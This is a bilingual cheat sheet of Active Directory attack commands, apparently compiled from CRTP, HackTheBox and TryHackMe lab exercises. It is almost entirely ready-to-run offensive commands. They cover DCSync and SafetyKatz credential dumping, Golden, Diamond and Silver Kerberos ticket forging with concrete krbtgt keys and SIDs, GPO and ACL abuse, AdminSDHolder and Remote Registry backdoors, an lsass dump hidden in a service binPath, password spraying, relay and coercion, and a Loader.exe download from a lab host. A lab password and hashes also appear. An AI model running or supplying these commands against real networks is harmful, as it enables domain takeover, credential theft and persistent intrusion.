#### Busca sesiones de admin de dominio y comprueba si el usuario actual tiene admin access en el mismo equipo. Muy util para ruta de salto.
```bash
Find-DomainUserLocation -CheckAccess
```

#### Opcion mas OPSEC-friendly: evita conectar a todo el dominio y usa una lista de targets controlada.
```bash
Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
```

#### Plantilla Groovy de laboratorio para ejecutar un comando controlado. Mantener [INSERT COMMAND] como placeholder evita dejar payloads peligrosos pegados en RedDrill.
```bash
def sout = new StringBuffer(), serr = new StringBuffer(); def proc = '[INSERT COMMAND]'.execute(); proc.consumeProcessOutput(sout, serr); proc.waitForOrKill(1000); println "out> $sout err> $serr"
```

#### Mide alcance: antes de modificar una GPO, identifica OUs/equipos/usuarios afectados.
```bash
Get-DomainOU -Properties name,gplink | Where-Object {$_.gplink -match 'GPO-GUID'}
```

#### GPOddity combina relay NTLM y modificacion del Group Policy Container. Prerequisito conceptual: usuario relayed con permiso de escritura/DACL sobre la GPO.
```bash
Get-DomainObjectAcl -Identity 'Target GPO' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|GenericWrite|WriteOwner'}
```

#### GPODitty template - Run the GPODitty command to create the new template
```bash
sudo python3 gpoditty.py --gpo-id '{0BF8D01C-1F62-4BDC-958C-57140B67D147}' --domain 'dollarcorp.moneycorp.local' --username 'student701' --password 'dCGbYRhFcaq0Btn' --command 'net localgroup administrators student701 /add' --rogue-smbserver-ip '172.16.100.1' --rogue-smbserver-share 'std701-gp' --dc-ip '172.16.2.1' --smb-mode none
```

#### GPODitty template - On another WSL session
```bash
cp -r /mnt/c/AD/Tools/GPODitty/GPOut/* /mnt/c/AD/Tools/std701-gp
```

#### GPODitty template - After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci
```bash
winrs -r:dcorp-ci cmd /c "set computername && set username"
```

#### One-to-many fan-out remoting. Ejecuta scriptblock no interactivo en paralelo contra lista de servidores.
```bash
Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content C:\AD\Tools\servers.txt)
```

#### DCSync extrae secretos desde el DC sin ejecutar codigo en el DC. Requiere DA/EA/DC o derechos de replicacion sobre el dominio.
```bash
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

#### Identificar maquinas con sesiones de Domain Admin - Enumeration using Invoke-SessionHunter. Busca sesiones de usuarios privilegiados en maquinas del dominio.
```bash
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

#### Identificar maquinas con sesiones de Domain Admin - Enumeration using Invoke-SessionHunter. Busca sesiones de usuarios privilegiados en maquinas del dominio.
```bash
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

#### Identificar maquinas con sesiones de Domain Admin - Query specific target machines. Busca sesiones de usuarios privilegiados en maquinas del dominio.
```bash
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```

#### Ejecutar SafetyKatz en `dcorp-mgmt` - Download Loader.exe
```bash
iwr http://172.16.100.81/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

#### OverPass-the-Hash con credenciales de `svcadmin`
```bash
winrs -r:dcorp-dc cmd /c set username
```

#### Tras DA, el foco pasa a dominio completo: persistencia, EA, trusts y Kerberos. Empieza por datos base del dominio.
```bash
Get-ADDomain | Select-Object DNSRoot,DomainSID,PDCEmulator
```

#### KDC corre en DCs. Enumera DCs para entender donde se emiten tickets.
```bash
Get-ADDomainController -Filter * | Select-Object HostName,Site,OperationMasterRoles
```

#### Lab: ejecutar variante tipo Mimikatz en DC como DA para obtener hash krbtgt. Muy intrusivo; DCSync suele evitar ejecucion en DC.
```bash
SafetyKatz.exe "lsadump::lsa /patch"
```

#### Plantilla Golden Ticket con valores manuales. Mantener placeholders obliga a enumerar y entender cada campo antes de forjar.
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:<domain_sid> /pwdlastset:'MM/DD/YYYY HH:MM:SS AM' /minpassage:1 /logoncount:<n> /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

#### Extrae solo los samAccountName de usuarios para crear listas de usuarios limpias para analisis o sprays controlados.
```bash
Get-DomainUser | Select-Object -ExpandProperty samaccountname
```

#### Lista los equipos del dominio por nombre DNS para construir inventario de hosts y posibles targets.
```bash
Get-DomainComputer | Select-Object -ExpandProperty dnshostname
```

#### Lista usuarios y descripcion para buscar pistas, credenciales documentadas o convenciones de cuentas.
```bash
Get-ADUser -Filter * -Properties * | Select-Object Samaccountname,Description
```

#### Recoge datos de ACL para BloodHound. En el diagrama interactivo, empieza por el edge que ves y traduce: permiso -> objeto -> accion posible -> impacto.
```bash
bloodhound-python -u user -p pass -d corp.local -dc dc.corp.local -c ACL,DCOnly
```

#### Abuso tipico cuando tienes GenericAll/AddMember sobre un grupo: agregas la cuenta controlada y heredas lo que ese grupo pueda hacer.
```bash
Add-DomainGroupMember -Identity 'Target Group' -Members attacker
```

#### Abuso tipico sobre usuario con GenericAll, ForceChangePassword o AllExtendedRights: reseteas la password y tomas la cuenta. Ojo: es ruidoso y cambia estado real.
```bash
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

#### RBCD sobre computer object cuando puedes escribir el atributo adecuado. Necesitas controlar una cuenta maquina o principal que pueda delegar.
```bash
Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount CONTROLLED$
```

#### Shadow credentials: si puedes escribir msDS-KeyCredentialLink sobre usuario/equipo, puedes autenticar con certificado sin conocer la password.
```bash
certipy shadow add -u user@corp.local -p pass -account victim
```

#### WriteDacl sobre el dominio: te concedes derechos de replicacion para DCSync. Es una ruta de impacto maximo.
```bash
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity attacker -Rights DCSync
```

#### Ejecuta DCSync una vez tengas DS-Replication-Get-Changes y DS-Replication-Get-Changes-All. Extrae secretos del dominio desde el DC.
```bash
secretsdump.py corp.local/attacker:'Passw0rd!'@dc.corp.local -just-dc
```

#### Abuso de GPO con GenericAll/GenericWrite/WriteDacl sobre la politica: anade admin local o ejecuta acciones en equipos donde la GPO aplique.
```bash
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName 'Target GPO'
```

#### RID, primary group y grupos. /ldap puede recuperarlos, pero especificarlos reduce consultas al DC.
```bash
/id:500 /pgid:513 /groups:544,512,520,513
```

#### Dominio, SID y DC. Sin SID correcto el ticket no encaja con el dominio.
```bash
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /dc:DCORP-DC.dollarcorp.moneycorp.local
```

#### Atributos usados para que el TGT se parezca a uno real. Son detalle OPSEC, no magia.
```bash
/pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
```

#### Extraer hashes del Domain Controller - In the new process
```bash
winrs -r:dcorp-dc cmd
```

#### Forging Golden Ticket usando Rubeus - Add "-path C:\AD\Tools\Rubeus.exe -args" after Loader.exe and "/ptt" at the end of the generated command. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBC5BA8C3DCA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

#### Objetivo de practica: elegir servicio, SPN y hash correcto antes de intentar ejecucion.
```bash
Learning Objective 9 -> probar HTTP/WMI para ejecucion en DC
```

#### WMI Service - Check if the correct service ticket was obtained
```bash
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

#### Crea/modifica TGT usando credenciales de un usuario y la clave krbtgt. Funciona porque parte de un TGT real.
```bash
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:studentx /password:<password> /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Variante con /tgtdeleg cuando tienes contexto de usuario de dominio y puedes obtener un TGT delegable.
```bash
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Ejecutar Diamond Ticket con Rubeus - Nota: ejecutar desde una shell elevada como administrador. El comando abre un nuevo proceso con el ticket inyectado. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbc5ba8c3dca848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Luego se podria autenticar como usuario valido con la password maestra configurada por la tecnica.
```bash
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
```

#### Pass-the-hash con el administrador local DSRM del DC.
```bash
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<dsrm_ntlm> /run:powershell.exe"
```

#### Rama post-DA: no es escalada inicial, es persistencia en controlador de dominio.
```bash
Learning Objective 11 -> persistencia con DSRM usando DA previo
```

#### Prepara un binario .NET para extraer SAM/DSRM en el DC dentro del flujo Sliver del lab.
```bash
./PEzor.sh -format=dotnet -sleep=5 /mnt/c/AD/Tools/Sliver/PEzor/mimikatz.exe -z 2 -b 1 -p '"token::elevate" "lsadump::sam" "exit"'
```

#### Con DA, dar FullControl en AdminSDHolder planta persistencia ACL sobre objetos protegidos.
```bash
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

#### Misma idea usando AD module/RACE toolkit.
```bash
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```

#### Fuerza SDProp manualmente en lab. En produccion normalmente esperarias la propagacion periodica.
```bash
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

#### Abuso de FullControl/WriteMembers: agregar una cuenta al grupo.
```bash
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

#### Alternativa con ActiveDirectory module.
```bash
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

#### Abuso de ResetPassword con PowerView.
```bash
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

#### Alternativa con ActiveDirectory module.
```bash
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

#### Concede FullControl en la raiz del dominio con PowerView.
```bash
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

#### Alternativa RACE/AD module para GenericAll.
```bash
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
```

#### Alternativa RACE para los GUID rights de DCSync.
```bash
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose
```

#### Comprueba los derechos efectivos de studentX sobre la raiz del dominio.
```bash
execute-assembly -p explorer.exe -t 40 /mnt/c/AD/Tools/Sliver/StandIn.exe '--object "distinguishedname=DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL" --access --ntaccount "dcorp\studentX"'
```

#### Si necesitas DA para conceder derechos, importa un Diamond/Golden valido antes de tocar ACLs.
```bash
execute-assembly -i -t 80 /mnt/c/AD/Tools/Sliver/Rubeus.exe 'diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /show /ptt'
```

#### Agrega solo derechos DCSync a studentX sobre el objeto dominio.
```bash
execute-assembly -p explorer.exe -t 80 /mnt/c/AD/Tools/Sliver/StandIn.exe '--object "distinguishedname=DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL" --grant "dcorp\studentX" --type DCSync --domain dollarcorp.moneycorp.local'
```

#### Concede acceso WMI en la maquina local.
```bash
Set-RemoteWMI -SamAccountName student1 -Verbose
```

#### Concede acceso WMI remoto sin credenciales explicitas.
```bash
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

#### Concede acceso WMI remoto con credenciales explicitas.
```bash
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\cimv2' -Verbose
```

#### Limpieza: elimina la ACE.
```bash
Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Remove -Verbose
```

#### Concede acceso PSRemoting local.
```bash
Set-RemotePSRemoting -SamAccountName student1 -Verbose
```

#### Concede acceso PSRemoting en remoto.
```bash
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose
```

#### Limpieza: elimina permisos.
```bash
Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
```

#### Agrega backdoor de Remote Registry para student1.
```bash
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
```

#### Recupera el hash de la cuenta maquina.
```bash
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

#### Recupera hash de cuenta local.
```bash
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

#### Recupera credenciales de dominio cacheadas.
```bash
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

#### Permitir WMI remoto para `student702` - Run as Domain Administrator to allow studentx access to WMI. Modifica security descriptor WMI para permitir acceso al usuario indicado.
```bash
Set-RemoteWMI -SamAccountName student702 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

#### Permitir WMI remoto para `student702` - Execute WMI queries on the DC as studentx
```bash
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

#### Permitir PowerShell remoting para `student702` - Similar modification can be done to PowerShell remoting configuration. Modifica permisos del endpoint PSRemoting para el usuario indicado.
```bash
Set-RemotePSRemoting -SamAccountName student702 -ComputerName dcorp-dc -Verbose
```

#### Permitir PowerShell remoting para `student702` - As normal user
```bash
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc
```

#### Recuperar hash de la cuenta de maquina - Run as DA. Agrega acceso Remote Registry para recuperar secretos remotos.
```bash
Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student702 -Verbose
```

#### Silver Tickets para HOST y RPCSS - Create Silver Tickets for HOST and RPCSS using the machine account hash to execute WMI queries. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:22f01da668a849cfc8dd5b0c36ef3ab4 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

#### Silver Tickets para HOST y RPCSS - Create Silver Tickets for HOST and RPCSS using the machine account hash to execute WMI queries. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:22f01da668a849cfc8dd5b0c36ef3ab4 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

#### Roast masivo a fichero.
```bash
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

#### Obtener hashes con Rubeus - Use Rubeus to get hashes for the svcadmin account
```bash
C:\AD\Tools\ArgSplit.bat
```

#### Obtener hashes con Rubeus - Use Rubeus to get hashes for the svcadmin account. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

#### Fuerza deshabilitar preauth si tienes GenericWrite/GenericAll sobre el usuario.
```bash
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Solicita AS-REP crackeable.
```bash
C:\AD\Tools\Rubeus.exe asreproast /user:VPN1user /outfile:C:\AD\Tools\asrephashes.txt
```

#### Roast del usuario al que acabas de poner SPN.
```bash
Rubeus.exe kerberoast /outfile:targetedhashes.txt
```

#### Alternativa: MS-DFSNM para coercion. Alternativa de coercion MS-DFSNM.
```bash
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

#### Escalation to Enterprise Admins - Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv. Fuerza autenticacion mediante Printer Bug en el lab.
```bash
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Abusar RBCD con Rubeus - Get AES keys of your student VM from an elevated shell. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

#### Solicitar Enrollment Agent certificate - Save certificate text to esc3.pem and convert to pfx
```bash
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

#### Solicitar certificado para DA
```bash
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

#### Solicita TGS para cuentas con SPN y genera material para Kerberoast.
```bash
GetUserSPNs.py corp.local/user:'Password123!' -dc-ip 10.10.10.10 -request
```

#### AS-REP roasting contra una lista de usuarios sin conocer password.
```bash
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass
```

#### Password spray sobre Kerberos manteniendo un flujo AD nativo.
```bash
kerbrute passwordspray -d corp.local users.txt 'Winter2025!'
```

#### Obtiene un TGT valido para trabajar luego con herramientas Kerberos-aware.
```bash
kinit user@CORP.LOCAL
```

#### Lista shares accesibles con la credencial actual.
```bash
smbclient -L //10.10.10.20 -U user%pass
```

#### Busca documentos, scripts y secretos en shares de forma automatizada.
```bash
netexec smb 10.10.10.0/24 -u user -p pass -M spider_plus
```

#### Ejecucion remota via SMB cuando tienes admin local.
```bash
psexec.py corp.local/user:'Password123!'@10.10.10.20
```

#### Ejecucion remota via WMI mas sigilosa que PsExec en algunos entornos.
```bash
wmiexec.py corp.local/user:'Password123!'@10.10.10.20
```

#### Acceso interactivo por WinRM si el servicio esta habilitado.
```bash
evil-winrm -i 10.10.10.20 -u user -p 'Password123!'
```

#### Alternativa remota basada en SMB para ejecucion de comandos.
```bash
smbexec.py corp.local/user:'Password123!'@10.10.10.20
```

#### Acceso grafico por RDP cuando la politica o el objetivo lo permite.
```bash
xfreerdp /v:10.10.10.20 /u:user /p:'Password123!' /cert:ignore
```

#### Enumera plantillas ADCS vulnerables.
```bash
certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable
```

#### Solicita un certificado para probar abuso de una plantilla vulnerable.
```bash
certipy req -u user@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -ca CORP-CA -template User
```

#### Obtiene e inyecta TGT en memoria si ya dispones del hash adecuado.
```bash
Rubeus.exe asktgt /user:user /rc4:NTLMHASH /ptt
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Get-ADUser -Filter *
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Get-ADUser -Filter * -SearchBase "CN=Users,DC=thmredteam,DC=com"
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
setspn.exe -Q */*
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Get-NetUser -SPN | select serviceprincipalname
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN/service"
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Request-SPNTicket -SPN "MSSQLSvc/server.domain" -Format Hashcat
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerberoast.csv -NoTypeInformation
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
Set-DomainObject -Identity <user> -Set @{serviceprincipalname='just/whateverUn1Que'}
```

#### 🔥 KERBEROAST – COMPLETE ATTACK GUIDE (AD / WINDOWS)
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=ldap* -p 389,636 192.168.1.1 -oN ldap_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u user -p pass --loggedon-users
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
enum4linux -U 192.168.1.1 # Solo usuarios
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
kerbrute passwordspray -d domain.com users.txt 'Password123!'
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
ldapsearch -h 192.168.1.1 -x -b "dc=domain,dc=com"
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
ldapsearch -h 192.168.1.1 -x -b "dc=domain,dc=com" "(objectClass=user)"
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-ntlmrelayx -6 -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-secretsdump domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-psexec domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-wmiexec domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-smbexec domain.com/user:password@192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-GetUserSPNs domain.com/user:password -dc-ip 192.168.1.1 -request
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip 192.168.1.1
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbclient -L //10.129.14.128 -U "user%pass"
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbclient //10.129.14.128/share -U user
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
lookupsid.py user:pass@10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbclient.py user:pass@10.129.14.128 -list
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbexec.py user:pass@10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
secretsdump.py user:pass@10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
crackmapexec smb 10.129.14.128 --shares -u user -p pass
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
crackmapexec smb 10.129.14.128 -u user -p pass
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
crackmapexec smb 10.129.14.128 -u user -p pass -x "whoami"
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
hydra -L users.txt -P pass.txt smb://10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo nmap --script smb-enum-shares,smb-enum-users -p445 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbmap -H 10.129.14.128 -u user -p pass
```

#### user_rid\
```bash
grep "User Name
```

#### 🔐 MIMIKATZ & KERBEROS – COMPLETE ATTACK & DEFENSE GUIDE
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
```

#### Agrega un nuevo principal de autenticación para el usuario root
```bash
ad_principal root@realcorp.htb
```

#### Ejecuta el comando ksu para obtener una shell con privilegios de superusuario
```bash
ksu
```

#### Ejecuta el script getST.py para realizar un ataque PassTheHash
```bash
getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int
```

#### Crear un objeto de credenciales con el nombre de usuario y la contraseña
```bash
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

#### Crea un objeto de credenciales para autenticación con un usuario y contraseña
```bash
New-Object System.Management.Automation.PSCredential('acute\imonks', $passwd)
```

#### Obtiene el HASH del usuario Admin utilizando Rubeus con un certificado .PFX
```bash
.\Rubeus.exe asktgt /domain:sequel.htb /user:Administrator /certificate:C:\Users\Ryan.Cooper\Desktop\cert.pfx /getcredentials
```

#### Solicitud enviada cuando un usuario inicia sesión en su máquina unida a AD
```bash
as req
```

#### Solicitud enviada por el cliente que cifra el TGT junto con el usuario actual, el recurso de destino y la marca de tiempo
```bash
tgs req
```

#### Crear un proceso en un sistema remoto a través de WMI
```bash
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

#### Crear un objeto PSCredential con el nombre de usuario y la contraseña segura
```bash
New-Object System.Management.Automation.PSCredential $username, $secureString;
```

#### Conecta a THMJMP1 mediante SSH utilizando las credenciales de AD
```bash
ssh za.tryhackme.com\<AD Username>@thmjmp1.za.tryhackme.com
```

#### Ejecuta un comando como un usuario específico
```bash
runas /user:username "cmd.exe /c command"
```

#### Ver la lista de usuarios y computadoras en Active Directory
```bash
Usuarios y computadoras
```

#### Ver la lista de usuarios en el directorio Personas
```bash
Directorio Personas
```

#### Ver las propiedades de un usuario
```bash
Propiedades
```

#### Ver los atributos de un usuario
```bash
Atributos
```

#### Ver los grupos a los que pertenece un usuario
```bash
Grupos
```

#### Inyectar credenciales de AD en la memoria para ejecutar comandos con privilegios de red
```bash
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

#### Enumerar usuarios de AD
```bash
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
```

#### Enumerar usuarios de AD con filtro de propiedad
```bash
Get-ADUser -Identity beth.nolan -Properties Title | Select-Object -Property Title
```

#### Enumerar nombres de usuario válidos y realizar ataques de rociado de contraseñas
```bash
Kerbrute
```

#### Listado de opciones de ayuda de GetUserSPNs.py
```bash
GetUserSPNs.py -h
```

#### Listado de cuentas SPN con GetUserSPNs.py
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

#### Consultar archivo de usuarios para SPNs que están ejecutándose bajo una cuenta de usuario
```bash
GetUserSPNs.py -usersfile USERSFILE
```

#### Solicitar un ticket de Kerberos para un SPN
```bash
GetUserSPNs.py -request
```

#### Solicitar un ticket de Kerberos para un SPN con un usuario específico
```bash
GetUserSPNs.py -request-user username
```

#### Guardar el resultado en un archivo
```bash
GetUserSPNs.py -save
```

#### Activar depuración
```bash
GetUserSPNs.py -debug
```

#### Usar hashes de contraseña de NTLM
```bash
GetUserSPNs.py -hashes LMHASH:NTHASH
```

#### No pedir contraseña
```bash
GetUserSPNs.py -no-pass
```

#### Usar una clave AES
```bash
GetUserSPNs.py -k
```

#### Usar una clave AES específica
```bash
GetUserSPNs.py -aesKey hex key
```

#### Obtiene la información de grupo local para la cuenta SAPService
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student -request-user SAPService
```

#### Restablecer la contraseña de un usuario
```bash
Set-DomainUserPassword
```

